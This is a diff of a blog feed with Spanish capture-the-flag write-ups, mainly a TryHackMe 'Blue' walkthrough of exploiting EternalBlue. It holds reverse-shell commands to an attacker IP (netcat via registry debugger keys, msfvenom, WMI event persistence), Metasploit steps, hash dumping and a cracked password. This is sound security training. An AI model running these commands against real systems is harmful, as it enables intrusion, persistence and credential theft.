-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe&quot; /v Debugger /f</span><br></pre></td></tr></table></figure></div>
-
-<p>Si nos ponemos en escucha por el puerto 443 y abrimos el explorador de archivos veremos lo siguiente:</p>
-<p><figure class="image-caption"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/01/09/Blue/obtain_reverse_shell_open_explorer.png"
-                      alt="Obteniendo una reverse shell al abrir el explorador de archivos."
-                ><figcaption>Obteniendo una reverse shell al abrir el explorador de archivos.</figcaption></figure></p>
-<p>Cómo podeis ver es un poco bastante cantoso, porque se ve la terminal y indica que el comando _explorer no se ha reconocido, según la aplicación que utiliceis se mostrará de una manera u otra. No es recomendable para casos de auditorías reales donde se busque la descripción. Normalmente es útil identificar que aplicaciones son las que abre el usuario constantemente(por ejemplo el office) y realizar algo así, pero más camuflado.</p>
-<p>Cuando se cierra la aplicación se cierra el proceso de la cmd, tienes que buscar la manera rápida de poner el proceso en segundo plano o directamente hacerlo al enviar el comando de netcat.</p>
-<h2 id="2-Cuando-se-cierra-un-programa-que-nos-de-una-shell"><a href="#2-Cuando-se-cierra-un-programa-que-nos-de-una-shell" class="headerlink" title="2. Cuando se cierra un programa que nos de una shell."></a>2. Cuando se cierra un programa que nos de una shell.</h2><p>Esta última opción, desconozco el motivo, pero <strong>no consigue darme una shell</strong>, dejo por aquí cómo sería el código.</p>
-<p>Vamos a indicar que cuando se cierre el bloc de notas(notepad) nos de una shell:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d <span class="number">512</span> </span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d <span class="number">1</span></span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\Temp\postExplotacion\nc.exe -e C:\Windows\System32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> <span class="number">443</span>&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo"><a href="#3-Utilizando-los-eventos-WMI-para-ejecutar-una-tarea-en-intervalos-regulares-de-tiempo" class="headerlink" title="3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo."></a>3. Utilizando los eventos WMI para ejecutar una tarea en intervalos regulares de tiempo.</h2><p>Está es la mejor de las tres porque es la manera más “sigilosa”, vamos a hacer que <strong>cada minuto</strong> mande una shell a nuestro equipo, pero antes de eso</p>
-<p>Creación de binario para reverse shell con msfvenom:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10</span>.<span class="number">21</span>.<span class="number">60</span>.<span class="number">116</span> LPORT=<span class="number">443</span> -f exe -o persistencia.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>Una vez transferido con certutil(no hace falta ofuscarlo) vamos a ejecutar el binario y nos ponemos en escucha en nuestro equipo para comprobar que esta correcto y llega la shell.</p>
-<p>Una vez comprobado que llega la shell, vamos a introducir los siguientes registros:</p>
-<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic /NAMESPACE: &quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;persistence&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN <span class="number">60</span> WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer CREATE Name=&quot;persistence&quot;, ExecutablePath=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot;,CommandLineTemplate=&quot;C:\Windows\Temp\postExplotacion\persistencia.exe&quot; </span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding CREATE Filter=&quot;___EventFilter.Name=&quot;persistence&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=&quot;persistence&quot;&quot;</span><br></pre></td></tr></table></figure></div>
-
-<p>Nos ponemos en escucha con netcat como siempre y si esperamos un minuto nos da una consola del usuario Administrator. </p>
-<h1 id="Conclusiones-finales"><a href="#Conclusiones-finales" class="headerlink" title="Conclusiones finales"></a>Conclusiones finales</h1><p>Podéis apreciar como se ha podido complicar una simple máquina “Easy”(fácil) cuando te despegas de Metasploit y te metes más en el barro para saber que está pasando, está metodología se utiliza para un mayor control de las situaciones y donde el metasploit no llega, la explotación manual es completamente válida para una certificación como OSCP. Espero que os haya gustado esta máquina y hayáis aprendido tanto como yo en el camino o más:).</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>tryhackme</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>tryhackme</tag>
-        <tag>easy</tag>
-        <tag>windows</tag>
-        <tag>eternalblue</tag>
-        <tag>ms17-010</tag>
-        <tag>eJPT</tag>
-        <tag>metasploit</tag>
-        <tag>manual exploitation</tag>
-        <tag>triple z script&quot;</tag>
-        <tag>AutoBlue</tag>
-        <tag>mimikatz</tag>
-        <tag>Windows Defender Evasion</tag>
-        <tag>Ebowla</tag>
-        <tag>enable RDP with netexec</tag>
-        <tag>windows persistence</tag>
-        <tag>persistence with debugging</tag>
-        <tag>persistence with gflags</tag>
-        <tag>persistence with WMI Events</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Symfonos 1 y 2 | Pivoting I</title>
     <url>/2024/12/04/Symfonos%201%20y%202/</url>
     <content><![CDATA[<h1 id="Introduccion-al-Pivoting"><a href="#Introduccion-al-Pivoting" class="headerlink" title="Introducción al Pivoting."></a>Introducción al Pivoting.</h1><p>Bueenos días&#x2F;tardes&#x2F;noches hackerss, hoy vamos a montarnos un laboratorio de máquinas vulnerables para aprender un poco de <strong>Pivoting(Moverse lateralmente para comprometer otro dispositivo)</strong>.</p>
@@ -1581,13 +900,694 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-        <tag>eJPT</tag>
         <tag>vulnhub</tag>
         <tag>medium</tag>
         <tag>linux</tag>
         <tag>pivoting</tag>
+        <tag>eJPT</tag>
         <tag>eCPPTv2</tag>
         <tag>eCPTXv2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blue</title>
+    <url>/2025/01/09/Blue/</url>
+    <content><![CDATA[<h1 id="Introduccion"><a href="#Introduccion" class="headerlink" title="Introducción"></a>Introducción</h1><p>Bienvenidos a este humilde WriteUp sobre esta sencillita máquina Windows que nos será de utilidad para repasar conceptos básicos y la explotación de diferentes formas sobre la vulnerabilidad <strong>MS17-010</strong> o mayormente conocida como <strong>EternalBlue</strong>. Para que un sea un simple Write-up más hacer dos tipos de explotaciones, una automática con metasploit y otra manual, aunque para la manual tengo que recalcar que la máquina de tryhackme no está preparada para esto y en ciertas ocasiones tendremos problemas, en cambio, existe la misma máquina sin estos problemas en la plataforma hack the box(se necesita subscripción). También comentaros que veréis diferentes ips de “víctima” porque no lo he podido hacer todo de golpe o he tenido que reiniciar la máquina.</p>
+<h1 id="Montar-el-laboratorio"><a href="#Montar-el-laboratorio" class="headerlink" title="Montar el laboratorio"></a>Montar el laboratorio</h1><p>Hace tiempo escuche en un vídeo de S4vitar sobre el gran problema que tiene TryHackMe para ocultar las conexiones entre los diferentes dispositivos conectados a su VPN, no sé si en la actualidad esto estará solucionado, pero para asegurarnos os comparto un <a class="link"   href="https://github.com/Wh1teDrvg0n/safeVPN-THM" >recurso de Wh1teDrvg0n<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que son unas reglas para prohibir las conexiones entrantes no deseadas.</p>
+<p>Aseguraros de no tener reglas propias o alguna copia de estas porque al finalizar la máquina limpiaremos todas las reglas existentes.</p>
+<h2 id="Conexion-VPN"><a href="#Conexion-VPN" class="headerlink" title="Conexión VPN"></a>Conexión VPN</h2><ol>
+<li><p>Nos descargamos el archivo VPN, tu icono &gt; Access &gt; Selecciona el servidor VPN y te lo descargas. Puede que el servidor no funcione o no esté disponible, esto lo comprobarás si al lanzar la vpn no se conecta(se queda intentándolo todo el tiempo).</p>
+</li>
+<li><p>Lanzamos la VPN:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> openvpn user.ovpn</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h2 id="Configuracion-de-reglas-de-seguridad"><a href="#Configuracion-de-reglas-de-seguridad" class="headerlink" title="Configuración de reglas de seguridad."></a>Configuración de reglas de seguridad.</h2><p>Esta consola debéis de dejarla abierta para que la conexión no se muera.</p>
+<ol start="3">
+<li><p>Comprobamos que no exista ninguna regla:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -L -v -n</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/primera_comprobacion_ip_tables.png"
+                      alt="iptables vacío."
+                ><figcaption>iptables vacío.</figcaption></figure></p>
+</li>
+<li><p>Ejecutamos el script y comprobamos las reglas utilizando el comando anterior.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./safevpn-thm.sh ip_máquina_víctima</span><br></pre></td></tr></table></figure></div>
+<p>La ip indicada es la correspondiente con tun0, interfaz creada por la VPN.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/iptable_despues_del_script.png"
+                      alt="iptable después de ejecutar el script."
+                ><figcaption>iptable después de ejecutar el script.</figcaption></figure></p>
+</li>
+</ol>
+<p>Script para limpiar las reglas:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv4</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv6</span></span><br><span class="line">ip6tables -t nat -F</span><br><span class="line">ip6tables -t mangle -F</span><br><span class="line">ip6tables -F</span><br><span class="line">ip6tables -X</span><br><span class="line">ip6tables -Z</span><br><span class="line">ip6tables -P INPUT ACCEPT</span><br><span class="line">ip6tables -P FORWARD ACCEPT</span><br><span class="line">ip6tables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Todas las reglas de iptables e ip6tables han sido eliminadas.&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="Estructura-de-directorios"><a href="#Estructura-de-directorios" class="headerlink" title="Estructura de directorios."></a>Estructura de directorios.</h2><p>Por último y no menos importante debemos de crear la estructura de directorios para almacenar la información relevante que vayamos obteniendo.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> &#123;recog,data,exploitation&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Lanzamos la máquina en TryHackMe y cogemos la ip al vuelo.</p>
+<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><p>TryHackMe nos facilita la labor y nos da la IP de la máquina realizada para ser explotada, como sabéis lo primero a realizar es comprobar si el host está activo.</p>
+<h2 id="Disponibilidad-del-host"><a href="#Disponibilidad-del-host" class="headerlink" title="Disponibilidad del host"></a>Disponibilidad del host</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 10.10.210.75</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Escaneo-con-nmap"><a href="#Escaneo-con-nmap" class="headerlink" title="Escaneo con nmap"></a>Escaneo con nmap</h2><p>Vamos a descubrir los puertos abiertos de la máquina:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate 4500 -vvv -n -Pn 10.10.210.75 -oG allPorts</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/escaneo_puertos_nmap.png"
+                      alt="Escaneo de puertos con nmap."
+                ><figcaption>Escaneo de puertos con nmap.</figcaption></figure><br>Recuerda que puedes utilizar varias herramientas y comparar resultados, puedes encontrar algún dato extra.</p>
+<h2 id="Escaneo-con-netcat"><a href="#Escaneo-con-netcat" class="headerlink" title="Escaneo con netcat"></a>Escaneo con netcat</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -zv 10.10.210.75 1-1000</span><br></pre></td></tr></table></figure></div>
+
+<p>Tienes más cómo unicornscan, angryscan, un script en bash…</p>
+<h2 id="Extraccion-de-puertos-manual"><a href="#Extraccion-de-puertos-manual" class="headerlink" title="Extracción de puertos manual"></a>Extracción de puertos manual</h2><p>Para escanear los servicios y versiones de los puertos vamos a copiar los puertos en la clipboard, pero en este caso son muchos y no lo queremos copiar a mano podemos utilizar varias utilidades en un momento para ordenar y obtener solo el número de puertos del archivo grepeable extraido.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Ports:&quot;</span> allPorts | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tail</span> -n +4 | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed <span class="string">&#x27;s/.$//&#x27;</span> | xargs</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/extract_ports_manually.png"
+                      alt="Extracción de puertos manualmente."
+                ><figcaption>Extracción de puertos manualmente.</figcaption></figure></p>
+<ul>
+<li><strong>grep “Ports:” allPorts</strong>: Obtenemos la línea que contiene todos los puertos encontrados.</li>
+<li><strong>tr ‘ ‘ ‘\n’</strong>: Sustituimos los espacios por saltos de línea.</li>
+<li><strong>tail -n +4</strong>: Muestra todas las líneas menos las 4 primeras.</li>
+<li><strong>awk -F ‘&#x2F;‘ ‘{print $1}’</strong>: Indicas que el delimitador es ‘&#x2F;‘ y que quieres obtener el primer resultado.</li>
+<li><strong>tr ‘\n’ ‘,’</strong>: Sustituimos los saltos de línea por comas.</li>
+<li><strong>sed ‘s&#x2F;.$&#x2F;&#x2F;‘</strong>: Realizamos una sustitución(s -&gt; search and replace), el’.’ representa cualquier carácter, el $ representa el final de la línea y en la zona de remplazo(&#x2F;&#x2F;) no indicamos nada(entonces se elimina).</li>
+</ul>
+<h2 id="Escaneo-de-servicios-y-versiones"><a href="#Escaneo-de-servicios-y-versiones" class="headerlink" title="Escaneo de servicios y versiones"></a>Escaneo de servicios y versiones</h2><p>Escaneo de versión y servicios de los puertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p135,139,445,49152,49153,49154,49158,49160 10.10.197.255 -oN targeted</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/version_and_services_nmap.png"
+                      alt="Versión y servicios corriendo en dichos puertos."
+                ><figcaption>Versión y servicios corriendo en dichos puertos.</figcaption></figure></p>
+<p>Podemos encontrar alguna información como el nombre del equipo: Jon-PC, Windows 7 y diferentes versiones.</p>
+<p>A continuación vamos a ver si nos permite hacer uso de null session.</p>
+<h2 id="Comprobaciones-SMB-y-Null-Session"><a href="#Comprobaciones-SMB-y-Null-Session" class="headerlink" title="Comprobaciones SMB y Null Session"></a>Comprobaciones SMB y Null Session</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.210.75 -N</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/smbclient_null_session.png"
+                      alt="Uso de null session con smbclient."
+                ><figcaption>Uso de null session con smbclient.</figcaption></figure></p>
+<p>Podemos probar con smbmap, pero comprobamos que tampoco nos deja:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.210.75</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/smbmap_error.png"
+                      alt="Intento de conexión con smbmap."
+                ><figcaption>Intento de conexión con smbmap.</figcaption></figure></p>
+<p>Llegados a este punto podemos comprobar si existen vulnerabilidades existentes para este Windows 7. Para ello utilizaremos algunos script en nmap, estos están divididos en <strong>categorías</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">locate .nse | xargs grep <span class="string">&quot;categories&quot;</span> | grep -oP <span class="string">&#x27;&quot;.*?&quot;&#x27;</span> | <span class="built_in">sort</span> -u </span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/categorias_nmap.png"
+                      alt="Categorías sobre los scripts de nmap."
+                ><figcaption>Categorías sobre los scripts de nmap.</figcaption></figure></p>
+<p>Como es un Windows 7 y el smb esta expuesto comprobamos las vulnerabilidades(vuln) de forma no intrusiva(safe):</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p445 --script <span class="string">&quot;vuln and save&quot;</span> 10.10.197.255</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/detect_eternalblue_general_vuln_nmap.png"
+                      alt="Detección del eternal blue con nmap."
+                ><figcaption>Detección del eternal blue con nmap.</figcaption></figure></p>
+<p>Puedes indicar el script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 445 --script smb-vuln-ms17-010 10.10.197.255</span><br></pre></td></tr></table></figure></div>
+
+<p>Puedes utilizar netexec(crackmapexec). Para instalarlo en arch he utilizado el siguiente comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install git+https://github.com/Pennyw0rth/NetExec</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.197.255 -M ms17-010</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_eternalblue.png"
+                      alt="Utilizando netexec para comprobar si eternalblue existe."
+                ><figcaption>Utilizando netexec para comprobar si eternalblue existe.</figcaption></figure></p>
+<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="Explotacion-con-metasploit"><a href="#Explotacion-con-metasploit" class="headerlink" title="Explotación con metasploit"></a>Explotación con metasploit</h2><h3 id="Configuracion-inicial-del-exploit"><a href="#Configuracion-inicial-del-exploit" class="headerlink" title="Configuración inicial del exploit."></a>Configuración inicial del exploit.</h3><p>Para explotarlo tenemos diferentes maneras de hacerlo:</p>
+<p>Mediante metasploit:</p>
+<p>Para explotar eternal blue mediante metasploit tenemos que seguir una serie de pasos.</p>
+<ol>
+<li><p>Abrir metasploit con el comando <strong>msfoconsole</strong></p>
+</li>
+<li><p>Buscar por eternalblue: <strong>search eternalblue</strong>.</p>
+</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/search_eternalblue_metasploit.png"
+                      alt="Buscamos por eternalblue."
+                ><figcaption>Buscamos por eternalblue.</figcaption></figure></p>
+<ol start="3">
+<li>Copiamos el nombre del primero y indicamos que lo queremos usar:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></div></li>
+<li>Miramos cuáles son las opciones a rellenar para que el payload funcione correctamente:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>En este caso, si nos fijamos tenemos que configurar todas las opciones que sean “yes” en Required, al menos que ya haya una configuración por defecto que coincida con nuestra información.</p>
+<ol start="5">
+<li>Seteamos el RHOST:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 10.10.114.58</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>Si volvemos a ejecutar la orden show options, nos aparecerá la ip indicada, en caso de equivocarnos podemos utilizar el comando <strong>unset RHOSTS</strong></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/show_parameters_value_eternalblue_metasploit.png"
+                      alt="Ip víctima seteada."
+                ><figcaption>Ip víctima seteada.</figcaption></figure></p>
+<ol start="6">
+<li><p>Indicamos LHOST(ya que por defecto utiliza la ip de otra interfaz). Está es la ip que nos da la vpn de tryhackme(tun0).</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 10.21.60.116</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>Debemos de configurar un payload, esto es el código que se ejecuta en la víctima, normalmente para obtener acceso a ella usando alguna shell, depende de nuestras preferencias usaremos uno u otro(puedes ver los todos con el comando show payloads):</p>
+</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/shell/reverse_tcp</span><br></pre></td></tr></table></figure></div>
+
+<p>En este caso utilizo una reverse shell para que el equipo víctima me envia una shell a mí.</p>
+<ol start="8">
+<li>Ejecutamos el exploit con el comando <strong>run</strong> o <strong>exploit</strong>. En caso de que no funcione revisar que las direcciones esten correctas, que no haya ningun servicio utilizado en el puerto 4444 y a las malas(como fue mi caso) tuve que reiniciar la máquina víctima.</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/conectados_con_metasploit.png"
+                      alt="Conexión exitosa con metasploit."
+                ><figcaption>Conexión exitosa con metasploit.</figcaption></figure></p>
+<p>Ya podemos introducir comandos en el equipo víctima.</p>
+<p>Una vez aquí nos vamos a salir, para ello utilizamos el comando <strong>background</strong> o <strong>ctrl+z</strong>. Vamos a cambiar nuestra sesión reverse shell por una de tipo <strong>meterpreter</strong>, está sesión es la que se usa por defecto y en lugar de enfadarte y pensar que porque no he usado esta primero es para que nos familiaricemos con la herramienta metasploit.</p>
+<p>Meterpreter tiene algunas ventajas frente a la reverse shell cómo: </p>
+<ul>
+<li>Se carga en memoria.</li>
+<li>Capturas de pantalla.</li>
+<li>Registros de teclas..</li>
+<li>..</li>
+</ul>
+<h3 id="Cambio-de-reverse-shell-a-Meterpreter"><a href="#Cambio-de-reverse-shell-a-Meterpreter" class="headerlink" title="Cambio de reverse shell a Meterpreter"></a>Cambio de reverse shell a Meterpreter</h3><p>Bien, para cambiar de reverse shell a meterpreter vamos a seguir los siguientes pasos:</p>
+<ol>
+<li>Cambiamos al siguiente módulo: <strong>use post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong>2. Como antes vemos los parámetros a configurar: <strong>show options</strong>, en este caso solo debemos indicar el ID de la sesión que contiene la reverse shell.</li>
+<li>Para ver el ID de la sesión suspendida debemos utilizar <strong>sessions -l</strong>* y seguramente tenga el ID 1.</li>
+<li>Seteamos el parámetro: <strong>set SESSION 1</strong></li>
+<li>Ejecutamos: <strong>run</strong></li>
+<li>Al finalizar comprobamos nuestras sesiones y debe de aparecer una nueva sesión con meterpreter.</li>
+<li>Nos metemos a ella con el comando <strong>sessions -i 2</strong>(En mi caso con 3 porque cree otra sesión y elimine la 2).</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/sesiones_metasploit_cambio_de_reverse_shell_a_meterpreter.png"
+                      alt="Sesiones disponibles."
+                ><figcaption>Sesiones disponibles.</figcaption></figure></p>
+<p>Comandos y algunos extra.</p>
+<p><strong>session -i ID</strong>: Para conectarnos a la sesión.<br><strong>sessions -k ID</strong>: Para eliminar alguna sesión.<br><strong>sessions -K</strong>: Para eliminar todas las sesiones.</p>
+<p>Vamos a escalar privilegios de una forma muy sencilla con meterpreter, si utilizamos el comando <strong>help</strong> para ver los comandos que tenemos disponibles, vemos <strong>getsystem</strong> como bien pone en su descripción realiza un intento para escalar privilegios sobre el equipo, si este tiene éxito nos elevará a <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<p>Podemos hacer getuid para saber con que usuario estamos ahora y saldrá NT AUTHORITY\SYSTEM, esto es porque el servicio smb del que nos hemos aprovechado lo esta utilizando dicho usuario, aunque no tiene porque ser siempre así.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/comprobacion_nt_authority_system_meterpreter.png"
+                      alt="Usuario NT AUTHORITY\SYSTEM."
+                ><figcaption>Usuario NT AUTHORITY\SYSTEM.</figcaption></figure></p>
+<p>Vamos a ver por encima el concepto de <strong>“migrar el proceso”</strong>, esto puede ser útil para obtener persistencia, para evadir una detección…</p>
+<p>Cuando migras a un proceso, tienes que ver que sea de NT AUTHORITY\SYSTEM(el mismo usuario) y que en la última columna de la derecha(la de path) <strong>no este vacía</strong>. Todo esto se puede ver con el comando:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></div>
+
+<p>El comando sería:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>No se lo recomiendo hacer</strong> no suele ir muy bien, o no funciona en muchos procesos o la sesión se queda pillada y te tienes que salir, y luego no te deja volver a pasar la reverse shell a una sesión meterpreter, si paso esto recomiendo cerrar metasploit y establecer una conexión directamente con meterpreter.</p>
+<p>Para obtener el hash de los usuarios del sistema tenemos el comando <strong>hashdump</strong> en la sesión meterpreter.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hashdump_meterpreter.png"
+                      alt="Resultado de usar hashdump."
+                ><figcaption>Resultado de usar hashdump.</figcaption></figure></p>
+<p>Vamos a separar esto:</p>
+<ul>
+<li>Jon:1000: Nombre de usuario y el SID(Security Identifier)</li>
+<li>aad3b435b51404eeaad3b435b51404ee: La primera parte hasta los dos puntos es el <strong>hash LM</strong>. No nos sirve para nada porque ya no se usa.</li>
+<li>ffb43f0de35be4d9917ac0cc8ad57f8d: Esta segunda parte es el <strong>hash NTLM</strong></li>
+</ul>
+<p>Podemos utilizar diferentes herramientas para crackear dichos hashes NTLM:</p>
+<ul>
+<li>Crackstation: Página web con la que he podido sacar el hash NTLM de Jon.</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/crackstation_ntlm_jon_hashdump.png"
+                     
+                ></p>
+<p>La contraseña de Jon es: <strong>alqfna22</strong></p>
+<p>Obtención de flags:</p>
+<p>La primera está en la raíz:</p>
